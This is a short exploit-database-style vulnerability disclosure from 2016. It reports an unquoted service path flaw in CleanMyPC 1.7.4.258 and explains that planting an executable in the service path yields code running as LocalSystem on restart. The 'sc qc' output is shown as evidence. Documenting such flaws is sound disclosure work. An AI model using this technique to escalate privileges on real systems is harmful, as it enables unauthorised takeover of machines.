
# Exploit Title: CleanMyPC Unquoted Service Path Privilege Escalation
# Date: 20/10/2016
# Exploit Author: Federico Zambito
# Vendor Homepage: http://macpaw.com/cleanmypc
# Software Link: http://macpaw.com/cleanmypc
# Version: 1.7.4.258
# Tested on: Windows 7
########################################################

CleanMyPC application suffers from an unquoted service path issue.

To properly exploit this vulnerability,the local attacker must insert an executable file in the path of the service.

Upon service restart or system reboot, the malicious code will be run with elevated privileges

C:\>sc qc CleanMyPCService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: CleanMyPCService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\CleanMyPC\CleanMyPCService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : CleanMyPC Watcher
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

